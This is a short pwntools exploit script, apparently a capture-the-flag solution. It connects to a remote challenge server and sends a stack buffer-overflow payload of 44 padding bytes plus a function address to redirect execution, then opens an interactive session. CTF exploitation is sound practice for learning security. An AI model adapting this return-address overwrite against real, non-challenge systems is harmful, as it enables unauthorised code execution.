from pwn import *

# Connect to the remote challenge
p = remote('chals1.apoorvctf.xyz', 3001)

# Determine the offset (e.g., 44 bytes) and use the correct address of brew_coffee()
offset = 44
brew_coffee_addr = p32(0x0804856b)  # Using the address from disassembly

payload = b'A' * offset + brew_coffee_addr

p.sendline(payload)
p.interactive()
